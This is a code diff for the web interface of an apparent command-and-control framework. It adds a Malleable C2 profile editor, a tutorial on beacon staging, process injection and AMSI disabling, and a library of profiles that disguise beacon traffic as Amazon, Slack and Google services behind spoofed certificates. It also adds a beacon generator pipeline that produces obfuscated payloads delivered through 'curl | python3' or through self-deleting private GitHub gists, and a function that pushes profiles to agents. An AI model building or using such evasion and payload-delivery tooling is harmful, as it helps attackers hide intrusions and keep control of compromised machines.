+.c2pe-lib-card:hover{border-color:rgba(197,134,192,0.5);background:rgba(197,134,192,0.04)}
+.c2pe-lib-card h4{margin:0 0 4px;font-size:12px;color:var(--text);display:flex;align-items:center;gap:6px}
+.c2pe-lib-card h4 .lib-icon{font-size:15px}
+.c2pe-lib-card p{margin:0 0 6px;font-size:10px;color:var(--text2);line-height:1.4}
+.c2pe-lib-tags{display:flex;gap:4px;flex-wrap:wrap}
+.c2pe-lib-tag{font-size:9px;padding:1px 6px;border-radius:3px;background:rgba(255,255,255,0.06);color:var(--text2)}
+.c2pe-lib-tag.t-cdn{background:rgba(86,156,198,0.12);color:var(--blue)}
+.c2pe-lib-tag.t-saas{background:rgba(197,134,192,0.12);color:#c586c0}
+.c2pe-lib-tag.t-api{background:rgba(78,201,176,0.12);color:var(--green)}
+.c2pe-lib-tag.t-web{background:rgba(206,145,120,0.12);color:var(--orange)}
+.bgen-flow-toggle{display:flex;align-items:center;gap:6px;cursor:pointer;padding:6px 0 2px;font-size:11px;color:var(--text2);user-select:none;border:none;background:none;font-family:inherit;width:100%}
+.bgen-flow-toggle:hover{color:var(--text)}
+.bgen-flow-toggle .chevron{font-size:9px;transition:transform .2s}
+.bgen-flow-toggle.open .chevron{transform:rotate(90deg)}
+.bgen-flow-wrap{display:none;padding:8px 0 4px}
+.bgen-flow-toggle.open+.bgen-flow-wrap{display:block}
+.bflow{display:flex;flex-direction:column;align-items:center;gap:0}
+.bflow-node{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:8px 12px;width:100%;display:flex;align-items:center;gap:10px;font-size:11px}
+.bflow-node.active{border-color:var(--red);background:rgba(255,26,26,0.06)}
+.bflow-node.profile{border-color:rgba(197,134,192,0.5);cursor:pointer}
+.bflow-node.profile:hover{background:rgba(197,134,192,0.08)}
+.bflow-node.burp{border-color:rgba(206,145,120,0.5);cursor:pointer}
+.bflow-node.burp:hover{background:rgba(206,145,120,0.08)}
+.bflow-node.lint{border-color:rgba(78,201,176,0.4)}
+.bflow-node.gen{border-color:rgba(77,170,87,0.5)}
+.bflow-icon{font-size:16px;flex-shrink:0;width:24px;text-align:center}
+.bflow-body{flex:1;min-width:0}
+.bflow-title{font-weight:600;font-size:11px;color:var(--text)}
+.bflow-desc{font-size:10px;color:var(--text2);margin-top:1px}
+.bflow-arrow{display:flex;flex-direction:column;align-items:center;padding:2px 0;color:var(--text2)}
+.bflow-arrow svg{display:block}
+.bflow-arrow-line{width:1px;height:8px;background:rgba(255,255,255,0.12)}
+.bflow-split{display:flex;gap:6px;width:100%}
+.bflow-split .bflow-node{flex:1}
+.bflow-or{display:flex;align-items:center;gap:0;width:100%;padding:2px 0}
+.bflow-or-line{flex:1;height:1px;background:rgba(255,255,255,0.08)}
+.bflow-or-badge{font-size:8px;color:var(--text2);padding:1px 8px;border:1px solid rgba(255,255,255,0.08);border-radius:8px;text-transform:uppercase;letter-spacing:0.04em}
 </style>
 </head>
 <body>
@@ -2134,6 +2853,7 @@ async function renderAgentView(id){
       <span class="tag">${esc(info.os||'?')}</span>
       <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${info.pid||'?'} · up ${formatUptime(info.uptime||0)}</span>
       ${info.proxy_active ? '<span class="tag" style="background:#1a6e1a">PROXY: '+esc(info.proxy_active)+'</span>' : ''}
+      ${info.c2_profile && info.c2_profile.active ? '<span class="tag" style="background:#4a1a6e;cursor:pointer" onclick="showBeaconConfig()" title="Click for details">&#128737; C2 Profile</span>' : '<span class="tag" style="background:#333;opacity:0.5">No C2 Profile</span>'}
     </div>
     <div class="terminal-wrap">
       <div class="toolbar">
@@ -2868,8 +3588,37 @@ async function showBeaconGen(){
     +'<label>Gist filename <input id="bg-gist-fn" value="update.py" placeholder="update.py"></label>'
     +'<p style="font-size:10px;color:var(--text2);margin:2px 0 0">Creates a private gist. Auto-deletes when an agent connects.</p>'
     +'</div>'
-    +'<button class="ave-run" onclick="runBeaconGen()">\u{1F680} Generate Payload</button>'
+    +'<div style="display:flex;gap:8px;align-items:center">'
+    +'<button class="ave-run" style="flex:1" onclick="runBeaconGen()">\u{1F680} Generate Payload</button>'
+    +'<button class="c2pe-profile-btn" style="padding:6px 12px;border-radius:4px;cursor:pointer;font-size:11px;border:1px solid;background:none;font-family:inherit" onclick="showC2ProfileEditor()">&#128737; C2 Profile</button>'
+    +'<span id="bg-profile-status" style="font-size:9px;color:var(--text2)"></span>'
+    +'</div>'
     +'<div id="bg-result"></div>'
+    +'<button class="bgen-flow-toggle" onclick="this.classList.toggle(\'open\')"><span class="chevron">&#9654;</span> Pipeline Flow</button>'
+    +'<div class="bgen-flow-wrap"><div class="bflow">'
+    +'<div class="bflow-node active"><span class="bflow-icon">\u{1F680}</span><div class="bflow-body"><div class="bflow-title">Beacon Generator</div><div class="bflow-desc">Configure URL, key, interval, jitter, obfuscation layers</div></div></div>'
+    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
+    +'<div class="bflow-node profile" onclick="showC2ProfileEditor()"><span class="bflow-icon">\u{1F6E1}</span><div class="bflow-body"><div class="bflow-title">C2 Profile Editor</div><div class="bflow-desc">Syntax highlighting, tutorial, linter — click to open</div></div></div>'
+    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
+    +'<div class="bflow-or"><div class="bflow-or-line"></div><span class="bflow-or-badge">3 input paths</span><div class="bflow-or-line"></div></div>'
+    +'<div class="bflow-arrow"><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
+    +'<div class="bflow-split">'
+    +'<div class="bflow-node"><span class="bflow-icon">\u{1F4C4}</span><div class="bflow-body"><div class="bflow-title">Template</div><div class="bflow-desc">Azure/CDN preset</div></div></div>'
+    +'<div class="bflow-node burp" onclick="showC2ProfileEditor();setTimeout(showBurpImport,300)"><span class="bflow-icon">\u{1F50D}</span><div class="bflow-body"><div class="bflow-title">Burp Import</div><div class="bflow-desc">Paste raw HTTP</div></div></div>'
+    +'<div class="bflow-node"><span class="bflow-icon">\u{270F}</span><div class="bflow-body"><div class="bflow-title">Manual</div><div class="bflow-desc">Write profile</div></div></div>'
+    +'</div>'
+    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
+    +'<div class="bflow-node lint"><span class="bflow-icon">\u{26A1}</span><div class="bflow-body"><div class="bflow-title">Lint &amp; Validate</div><div class="bflow-desc">Syntax, braces, transforms, required fields</div></div></div>'
+    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
+    +'<div class="bflow-node gen"><span class="bflow-icon">\u{1F3AF}</span><div class="bflow-body"><div class="bflow-title">Generate Payload</div><div class="bflow-desc">Multi-layer obfuscation → inline or GitHub Gist</div></div></div>'
+    +'<div class="bflow-arrow"><div class="bflow-arrow-line"></div><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
+    +'<div class="bflow-or"><div class="bflow-or-line"></div><span class="bflow-or-badge">delivery</span><div class="bflow-or-line"></div></div>'
+    +'<div class="bflow-arrow"><svg width="8" height="6"><path d="M4 6L0 0h8z" fill="currentColor" opacity="0.3"/></svg></div>'
+    +'<div class="bflow-split">'
+    +'<div class="bflow-node gen"><span class="bflow-icon">\u{1F4CB}</span><div class="bflow-body"><div class="bflow-title">Inline</div><div class="bflow-desc">curl | python3</div></div></div>'
+    +'<div class="bflow-node gen"><span class="bflow-icon">\u{1F517}</span><div class="bflow-body"><div class="bflow-title">GitHub Gist</div><div class="bflow-desc">Private, auto-delete</div></div></div>'
+    +'</div>'
+    +'</div></div>'
     +'</div>';
   overlay.appendChild(panel);
   document.body.appendChild(overlay);
@@ -2878,6 +3627,19 @@ async function showBeaconGen(){
       document.getElementById("bg-gist-opts").style.display = r.value==="gist" && r.checked ? "block" : "none";
     });
   });
+  api("/api/server/c2-profile/active").then(d => {
+    const el = document.getElementById("bg-profile-status");
+    if(!el) return;
+    if(d.active){
+      const cfg = d.config || {};
+      const nGet = (cfg.http_get?.uris||[]).length;
+      const nPost = (cfg.http_post?.uris||[]).length;
+      el.innerHTML = '<span style="color:var(--green)">✔ Profile active</span>';
+      if(nGet||nPost) el.innerHTML += ` (${nGet+nPost} URIs)`;
+    } else {
+      el.textContent = "No profile — using default evasion";
+    }
+  }).catch(()=>{});
 }
 
 async function runBeaconGen(){
@@ -3050,6 +3812,1176 @@ function bgenAccordion(el){
   const wasOpen = el.classList.contains("open");
   el.parentElement.querySelectorAll(".bgen-deob-step").forEach(s => s.classList.remove("open"));
   if(!wasOpen) el.classList.add("open");
+}
+
+// ── C2 Malleable Profile Editor ──
+
+let _c2ProfileSource = "";
+
+const C2PE_DEFAULT = `# Malleable C2 Profile — TrashPandaPaws
+# Customize beacon traffic to blend with legitimate services
+
+set sleeptime "60000";
+set jitter    "20";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
+
+https-certificate {
+    set CN   "*.azurewebsites.net";
+    set O    "Microsoft Corporation";
+    set C    "US";
+    set validity "365";
+}
+
+http-get {
+    set uri "/api/v2/telemetry /api/v2/events /collect";
+
+    client {
+        header "Accept" "application/json, text/plain, */*";
+        header "Accept-Language" "en-US,en;q=0.9";
+
+        metadata {
+            base64url;
+            prepend "session=";
+            header "Cookie";
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json; charset=utf-8";
+        header "Cache-Control" "no-cache, no-store";
+        header "X-Request-Id" "trace-aef2b";
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/api/v2/submit /api/v2/report";
+
+    client {
+        header "Content-Type" "application/json";
+        header "X-Correlation-Id" "req-78fd3";
+
+        id {
+            base64url;
+            parameter "sid";
+        }
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json";
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}
+`;
+
+function c2peHighlight(code){
+  const lines = code.split("\n");
+  return lines.map(line => {
+    if(line.trimStart().startsWith("#"))
+      return '<span class="c2pe-hl-comment">'+esc(line)+'</span>';
+    let out = "";
+    let i = 0;
+    while(i < line.length){
+      if(line[i] === '"'){
+        let j = i+1;
+        while(j < line.length && line[j] !== '"'){ if(line[j]==='\\') j++; j++; }
+        if(j < line.length) j++;
+        out += '<span class="c2pe-hl-string">'+esc(line.slice(i,j))+'</span>';
+        i = j;
+      } else if(line[i] === '#'){
+        out += '<span class="c2pe-hl-comment">'+esc(line.slice(i))+'</span>';
+        break;
+      } else {
+        let j = i;
+        while(j < line.length && line[j] !== '"' && line[j] !== '#') j++;
+        let chunk = line.slice(i,j);
+        chunk = chunk.replace(/\b(http-get|http-post|http-stager|https-certificate|http-config|stage|process-inject|post-ex)\b/g,
+          '<span class="c2pe-hl-block">$1</span>');
+        chunk = chunk.replace(/\b(client|server|metadata|id|output|transform-x86|transform-x64|execute)\b/g,
+          '<span class="c2pe-hl-block">$1</span>');
+        chunk = chunk.replace(/\b(set|header|parameter)\b/g,
+          '<span class="c2pe-hl-keyword">$1</span>');
+        chunk = chunk.replace(/\b(base64url|base64|mask|netbios|netbiosu)\b/g,
+          '<span class="c2pe-hl-transform">$1</span>');
+        chunk = chunk.replace(/\b(prepend|append|print|uri-append|strrep|string|stringw)\b/g,
+          '<span class="c2pe-hl-directive">$1</span>');
+        out += chunk;
+        i = j;
+      }
+    }
+    return out;
+  }).join("\n");
+}
+
+function c2peUpdateLines(ta, linesEl){
+  const n = ta.value.split("\n").length;
+  let h = "";
+  for(let i=1;i<=n;i++) h+=i+"\n";
+  linesEl.textContent = h;
+}
+
+function c2peSyncScroll(ta, pre, linesEl){
+  pre.scrollTop = ta.scrollTop;
+  pre.scrollLeft = ta.scrollLeft;
+  linesEl.scrollTop = ta.scrollTop;
+}
+
+function showC2ProfileEditor(){
+  const overlay = document.createElement("div");
+  overlay.className = "c2pe-overlay";
+  overlay.onclick = e => { if(e.target===overlay){ _c2ProfileSource = overlay.querySelector("textarea")?.value || ""; overlay.remove(); }};
+
+  const tutorial = `
+<div class="c2pe-tut-section open">
+  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">Overview <span class="chevron">&#9654;</span></div>
+  <div class="c2pe-tut-body">
+    <p>A <b>Malleable C2 Profile</b> defines how beacon traffic looks on the wire. It controls HTTP headers, URIs, encoding, and timing to make C2 traffic blend in with legitimate services.</p>
+    <h4>Basic Syntax</h4>
+    <pre># Comments start with #
+set sleeptime "60000";   # Values in double quotes
+set jitter    "20";      # Semicolons required
+
+http-get {               # Block definitions
+    client { ... }       # Nested blocks
+    server { ... }
+}</pre>
+    <p><b>Rules:</b> All strings must use double quotes. Every statement ends with <code>;</code>. Blocks use <code>{ }</code>.</p>
+  </div>
+</div>
+<div class="c2pe-tut-section">
+  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">Global Options <span class="chevron">&#9654;</span></div>
+  <div class="c2pe-tut-body">
+    <table>
+      <tr><th>Option</th><th>Description</th></tr>
+      <tr><td><code>sleeptime</code></td><td>Callback interval in ms (e.g. "60000" = 60s)</td></tr>
+      <tr><td><code>jitter</code></td><td>% randomization (0-99)</td></tr>
+      <tr><td><code>useragent</code></td><td>HTTP User-Agent string</td></tr>
+      <tr><td><code>dns_idle</code></td><td>IP for "no tasks" via DNS</td></tr>
+      <tr><td><code>maxdns</code></td><td>Max DNS hostname length</td></tr>
+      <tr><td><code>host_stage</code></td><td>Host payload for staging ("true"/"false")</td></tr>
+      <tr><td><code>pipename</code></td><td>Named pipe for SMB beacons</td></tr>
+      <tr><td><code>headers_remove</code></td><td>Comma-separated headers to strip</td></tr>
+    </table>
+  </div>
+</div>
+<div class="c2pe-tut-section">
+  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">http-get / http-post <span class="chevron">&#9654;</span></div>
+  <div class="c2pe-tut-body">
+    <p>Define how beacon check-in (GET) and output submission (POST) look.</p>
+    <pre>http-get {
+    set uri "/api/v2/collect /updates";
+    client {
+        header "Accept" "application/json";
+        metadata {
+            base64url;
+            prepend "session=";
+            header "Cookie";
+        }
+    }
+    server {
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}</pre>
+    <h4>Required Structure</h4>
+    <p><code>http-get</code> client must contain a <code>metadata { }</code> block.<br>
+    <code>http-post</code> client must contain <code>id { }</code> and <code>output { }</code> blocks.<br>
+    Both need <code>client { }</code> and <code>server { }</code>.</p>
+  </div>
+</div>
+<div class="c2pe-tut-section">
+  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">Data Transforms <span class="chevron">&#9654;</span></div>
+  <div class="c2pe-tut-body">
+    <p>Transform blocks encode data for transport. Applied top-to-bottom.</p>
+    <table>
+      <tr><th>Transform</th><th>Effect</th></tr>
+      <tr><td><code>base64</code></td><td>Base64 encode</td></tr>
+      <tr><td><code>base64url</code></td><td>URL-safe base64</td></tr>
+      <tr><td><code>mask</code></td><td>XOR with random key</td></tr>
+      <tr><td><code>netbios</code></td><td>NetBIOS encode (lowercase)</td></tr>
+      <tr><td><code>netbiosu</code></td><td>NetBIOS encode (uppercase)</td></tr>
+      <tr><td><code>prepend</code></td><td>Prepend a string</td></tr>
+      <tr><td><code>append</code></td><td>Append a string</td></tr>
+    </table>
+    <h4>Termination (required)</h4>
+    <p>Every transform block must end with exactly one:</p>
+    <table>
+      <tr><td><code>print;</code></td><td>Data goes in HTTP body</td></tr>
+      <tr><td><code>header "Name";</code></td><td>Data stored in a header</td></tr>
+      <tr><td><code>parameter "Name";</code></td><td>Data in URL parameter</td></tr>
+      <tr><td><code>uri-append;</code></td><td>Append to URI path</td></tr>
+    </table>
+  </div>
+</div>
+<div class="c2pe-tut-section">
+  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">https-certificate <span class="chevron">&#9654;</span></div>
+  <div class="c2pe-tut-body">
+    <p>Configure the TLS certificate for HTTPS listeners.</p>
+    <pre>https-certificate {
+    set CN "*.example.com";
+    set O  "Example Inc.";
+    set C  "US";
+    set validity "365";
+}</pre>
+    <p>Options: <code>C</code>, <code>CN</code>, <code>O</code>, <code>OU</code>, <code>L</code>, <code>ST</code>, <code>validity</code>, <code>keystore</code>, <code>password</code></p>
+  </div>
+</div>
+<div class="c2pe-tut-section">
+  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">stage / process-inject / post-ex <span class="chevron">&#9654;</span></div>
+  <div class="c2pe-tut-body">
+    <h4>stage { }</h4>
+    <p>Controls Beacon DLL loading. Key options: <code>allocator</code>, <code>cleanup</code>, <code>obfuscate</code>, <code>sleep_mask</code>, <code>stomppe</code>, <code>userwx</code>, <code>smartinject</code>.</p>
+    <pre>stage {
+    set cleanup "true";
+    set obfuscate "true";
+    set sleep_mask "true";
+    set userwx "false";
+    transform-x86 {
+        prepend "\\x90\\x90\\x90";
+    }
+}</pre>
+    <h4>process-inject { }</h4>
+    <p>Controls injection: <code>allocator</code> (VirtualAllocEx/NtMapViewOfSection), <code>min_alloc</code>, <code>startrwx</code>, <code>userwx</code>.</p>
+    <h4>post-ex { }</h4>
+    <p>Post-exploitation: <code>spawnto_x86</code>, <code>spawnto_x64</code>, <code>amsi_disable</code>, <code>keylogger</code>.</p>
+  </div>
+</div>
+<div class="c2pe-tut-section">
+  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">Example Profiles <span class="chevron">&#9654;</span></div>
+  <div class="c2pe-tut-body">
+    <p>Community profiles that mimic real services:</p>
+    <table>
+      <tr><th>Profile</th><th>Mimics</th></tr>
+      <tr><td>amazon.profile</td><td>Amazon web traffic</td></tr>
+      <tr><td>gmail.profile</td><td>Gmail API calls</td></tr>
+      <tr><td>slack.profile</td><td>Slack API traffic</td></tr>
+      <tr><td>office365_calendar</td><td>O365 calendar sync</td></tr>
+      <tr><td>jquery-c2.4.2</td><td>jQuery CDN requests</td></tr>
+      <tr><td>safebrowsing</td><td>Google Safe Browsing</td></tr>
+    </table>
+    <p style="margin-top:8px"><a href="https://github.com/BC-SECURITY/Malleable-C2-Profiles" target="_blank" style="color:var(--blue)">Browse community profiles on GitHub &#8599;</a></p>
+  </div>
+</div>`;
+
+  overlay.innerHTML = `
+<div class="c2pe-panel">
+  <button class="c2pe-close" onclick="_c2ProfileSource=this.closest('.c2pe-panel').querySelector('textarea').value;this.closest('.c2pe-overlay').remove()">&#10005;</button>
+  <div class="c2pe-topbar">
+    <h2>&#128737; Malleable C2 Profile Editor</h2>
+    <button class="c2pe-lint-btn" onclick="c2peLint()">&#9889; Lint</button>
+    <button onclick="c2peSaveProfile()" style="border-color:rgba(77,170,87,0.5);color:var(--green)">&#128190; Save &amp; Apply</button>
+    <button onclick="c2pePushProfile()" style="border-color:rgba(255,26,26,0.4);color:var(--red)">&#128225; Push to Agents</button>
+    <button onclick="showBurpImport()">&#128270; Import from Burp</button>
+    <button onclick="showC2Library()">&#128218; Library</button>
+    <button onclick="c2peLoadDefault()">&#128196; Template</button>
+    <button onclick="c2peClear()">&#128465; Clear</button>
+  </div>
+  <div class="c2pe-body">
+    <div class="c2pe-editor-wrap">
+      <div class="c2pe-edit-container">
+        <div class="c2pe-lines" id="c2pe-lines"></div>
+        <pre id="c2pe-highlight"></pre>
+        <textarea id="c2pe-textarea" spellcheck="false" placeholder="Paste or write your Malleable C2 profile here..."></textarea>
+      </div>
+      <div class="c2pe-lint-bar" id="c2pe-lint-bar"></div>
+    </div>
+    <div class="c2pe-sidebar">${tutorial}</div>
+  </div>
+</div>`;
+
+  document.body.appendChild(overlay);
+
+  const ta = document.getElementById("c2pe-textarea");
+  const pre = document.getElementById("c2pe-highlight");
+  const linesEl = document.getElementById("c2pe-lines");
+
+  ta.value = _c2ProfileSource || "";
+  function update(){
+    pre.innerHTML = c2peHighlight(ta.value);
+    c2peUpdateLines(ta, linesEl);
+  }
+  ta.addEventListener("input", update);
+  ta.addEventListener("scroll", () => c2peSyncScroll(ta, pre, linesEl));
+  ta.addEventListener("keydown", e => {
+    if(e.key === "Tab"){
+      e.preventDefault();
+      const s = ta.selectionStart, en = ta.selectionEnd;
+      ta.value = ta.value.substring(0,s)+"    "+ta.value.substring(en);
+      ta.selectionStart = ta.selectionEnd = s+4;
+      update();
+    }
+  });
+  update();
+  if(!_c2ProfileSource){
+    api("/api/server/c2-profile/active").then(d => {
+      if(d.source && d.source.trim()){
+        _c2ProfileSource = d.source;
+        ta.value = d.source;
+        update();
+      } else {
+        c2peLoadDefault();
+      }
+    }).catch(() => c2peLoadDefault());
+  }
+}
+
+function c2peLoadDefault(){
+  const ta = document.getElementById("c2pe-textarea");
+  if(!ta) return;
+  ta.value = C2PE_DEFAULT;
+  _c2ProfileSource = C2PE_DEFAULT;
+  ta.dispatchEvent(new Event("input"));
+}
+
+function c2peClear(){
+  const ta = document.getElementById("c2pe-textarea");
+  if(!ta) return;
+  ta.value = "";
+  _c2ProfileSource = "";
+  ta.dispatchEvent(new Event("input"));
+  document.getElementById("c2pe-lint-bar").innerHTML = "";
+}
+
+async function c2peSaveProfile(){
+  const ta = document.getElementById("c2pe-textarea");
+  if(!ta || !ta.value.trim()){ toast("warn","C2 Profile","Editor is empty",3000); return; }
+  _c2ProfileSource = ta.value;
+  try{
+    const data = await api("/api/server/c2-profile/save", {
+      method:"POST",
+      body:JSON.stringify({source: ta.value})
+    });
+    if(data.error){ toast("err","C2 Profile",data.error,4000); return; }
+    const cfg = data.config || {};
+    let msg = "Profile saved";
+    if(cfg.useragent) msg += " — UA set";
+    const nGet = (cfg.http_get?.uris||[]).length;
+    const nPost = (cfg.http_post?.uris||[]).length;
+    if(nGet||nPost) msg += ` — ${nGet} GET, ${nPost} POST URIs`;
+    toast("ok","C2 Profile",msg,4000);
+  }catch(e){
+    toast("err","C2 Profile","Save failed: "+e.message,4000);
+  }
+}
+
+async function c2pePushProfile(){
+  try{
+    const check = await api("/api/server/c2-profile/active");
+    if(!check.active){
+      toast("warn","C2 Profile","No saved profile — click Save & Apply first",4000);
+      return;
+    }
+    const data = await api("/api/server/c2-profile/push", {
+      method:"POST",
+      body:JSON.stringify({})
+    });
+    if(data.error){ toast("err","C2 Profile",data.error,4000); return; }
+    toast("ok","C2 Profile","Profile pushed to "+data.count+" agent(s)",4000);
+  }catch(e){
+    toast("err","C2 Profile","Push failed: "+e.message,4000);
+  }
+}
+
+async function c2peLint(){
+  const ta = document.getElementById("c2pe-textarea");
+  const bar = document.getElementById("c2pe-lint-bar");
+  if(!ta || !bar) return;
+  _c2ProfileSource = ta.value;
+  try{
+    const data = await api("/api/server/c2-profile/lint", {
+      method:"POST",
+      body: JSON.stringify({source: ta.value})
+    });
+    const all = [...(data.errors||[]),...(data.warnings||[]),...(data.info||[])];
+    if(all.length === 0){
+      bar.innerHTML = '<div class="c2pe-lint-summary" style="color:var(--green)">&#10003; Profile is valid — no issues found ('+data.line_count+' lines)</div>';
+      toast("ok","C2 Profile","Profile is valid",3000);
+      return;
+    }
+    const ec = (data.errors||[]).length, wc = (data.warnings||[]).length, ic = (data.info||[]).length;
+    let html = '<div class="c2pe-lint-summary">';
+    if(ec) html += '<span style="color:var(--red)">'+ec+' error'+(ec>1?'s':'')+'</span> ';
+    if(wc) html += '<span style="color:var(--orange)">'+wc+' warning'+(wc>1?'s':'')+'</span> ';
+    if(ic) html += '<span style="color:var(--blue)">'+ic+' info</span>';
+    html += '</div>';
+    all.forEach(item => {
+      const sev = item.severity || "info";
+      html += '<div class="c2pe-lint-item" onclick="c2peGotoLine('+item.line+')">'
+        +'<span class="line">L'+item.line+'</span>'
+        +'<span class="sev-'+sev+'">'+sev+'</span>'
+        +'<span class="msg">'+esc(item.msg)+'</span>'
+        +'</div>';
+    });
+    bar.innerHTML = html;
+    if(ec) toast("err","C2 Profile",ec+" error(s) found",3000);
+    else toast("ok","C2 Profile","Profile checked — "+wc+" warning(s)",3000);
+  }catch(e){
+    toast("err","C2 Profile","Lint failed: "+e.message,4000);
+  }
+}
+
+function c2peGotoLine(n){
+  const ta = document.getElementById("c2pe-textarea");
+  if(!ta) return;
+  const lines = ta.value.split("\n");
+  let pos = 0;
+  for(let i=0;i<Math.min(n-1,lines.length);i++) pos += lines[i].length+1;
+  ta.focus();
+  ta.setSelectionRange(pos, pos + (lines[n-1]||"").length);
+  const lineHeight = 19.2;
+  ta.scrollTop = Math.max(0, (n-5)*lineHeight);
+}
+
+function c2peTutToggle(el){
+  const sec = el.closest(".c2pe-tut-section");
+  if(!sec) return;
+  const wasOpen = sec.classList.contains("open");
+  sec.parentElement.querySelectorAll(".c2pe-tut-section").forEach(s => s.classList.remove("open"));
+  if(!wasOpen) sec.classList.add("open");
+}
+
+const C2PE_LIBRARY = [
+{name:"Amazon CDN",icon:"\u{1F4E6}",desc:"Mimics Amazon CloudFront CDN traffic with typical e-commerce headers and cookie-based metadata.",tags:[["cdn","t-cdn"],["ecommerce","t-web"]],source:`# Amazon CloudFront CDN Profile
+set sleeptime "45000";
+set jitter    "35";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
+set host_stage "false";
+
+https-certificate {
+    set CN   "d1234abcdef.cloudfront.net";
+    set O    "Amazon";
+    set C    "US";
+    set validity "365";
+}
+
+http-get {
+    set uri "/images/shop /assets/product /content/media";
+
+    client {
+        header "Accept" "image/webp,image/apng,image/*,*/*;q=0.8";
+        header "Accept-Encoding" "gzip, deflate, br";
+        header "Referer" "https://www.amazon.com/";
+        header "X-Amz-Cf-Id" "xQ3hR7vN9kpL2mW8jY1";
+
+        metadata {
+            base64url;
+            prepend "session-id=";
+            header "Cookie";
+        }
+    }
+
+    server {
+        header "Content-Type" "image/gif";
+        header "Cache-Control" "max-age=31536000";
+        header "X-Cache" "Hit from cloudfront";
+        header "Via" "1.1 d1234abcdef.cloudfront.net (CloudFront)";
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/api/cart/update /api/wishlist/sync";
+
+    client {
+        header "Content-Type" "application/json";
+        header "X-Amz-RequestId" "SGBV4T5A2R1K3N8Q";
+
+        id {
+            base64url;
+            parameter "ref";
+        }
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json";
+        header "X-Amz-Cf-Pop" "FRA56-P4";
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}
+`},
+{name:"Slack Webhook",icon:"\u{1F4AC}",desc:"Emulates Slack API webhook and event subscription traffic patterns.",tags:[["saas","t-saas"],["api","t-api"]],source:`# Slack API Profile
+set sleeptime "30000";
+set jitter    "40";
+set useragent "Slackbot 1.0 (+https://api.slack.com/robots)";
+set host_stage "false";
+
+https-certificate {
+    set CN   "hooks.slack.com";
+    set O    "Slack Technologies";
+    set C    "US";
+    set validity "365";
+}
+
+http-get {
+    set uri "/api/conversations.history /api/channels.info /api/users.list";
+
+    client {
+        header "Accept" "application/json";
+        header "Accept-Charset" "utf-8";
+
+        metadata {
+            base64url;
+            prepend "xoxb-";
+            header "Authorization";
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json; charset=utf-8";
+        header "X-Slack-Req-Id" "a1b2c3d4-e5f6-7890";
+        header "Strict-Transport-Security" "max-age=31536000";
+
+        output {
+            mask;
+            base64;
+            prepend "{\\"ok\\":true,\\"messages\\":[{\\"text\\":\\"";
+            append "\\"}]}";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/api/chat.postMessage /api/files.upload";
+
+    client {
+        header "Content-Type" "application/json; charset=utf-8";
+
+        id {
+            base64url;
+            parameter "channel";
+        }
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json; charset=utf-8";
+
+        output {
+            mask;
+            base64;
+            prepend "{\\"ok\\":true,\\"ts\\":\\"";
+            append "\\"}";
+            print;
+        }
+    }
+}
+`},
+{name:"Google APIs",icon:"\u{1F50D}",desc:"Blends with Google Analytics and Fonts API traffic. Uses measurement protocol URIs.",tags:[["cdn","t-cdn"],["api","t-api"]],source:`# Google Analytics / APIs Profile
+set sleeptime "50000";
+set jitter    "25";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
+set host_stage "false";
+
+https-certificate {
+    set CN   "www.google-analytics.com";
+    set O    "Google LLC";
+    set C    "US";
+    set validity "365";
+}
+
+http-get {
+    set uri "/collect /g/collect /analytics.js";
+
+    client {
+        header "Accept" "*/*";
+        header "Accept-Encoding" "gzip, deflate, br";
+        header "Referer" "https://www.google.com/";
+
+        parameter "v" "2";
+        parameter "tid" "G-AB12CD34EF";
+        parameter "cid" "1234567890.9876543210";
+
+        metadata {
+            base64url;
+            parameter "_p";
+        }
+    }
+
+    server {
+        header "Content-Type" "image/gif";
+        header "Cache-Control" "no-cache, no-store, must-revalidate";
+        header "X-Content-Type-Options" "nosniff";
+
+        output {
+            mask;
+            base64;
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/batch /j/collect";
+
+    client {
+        header "Content-Type" "application/x-www-form-urlencoded";
+
+        id {
+            netbios;
+            parameter "gtm";
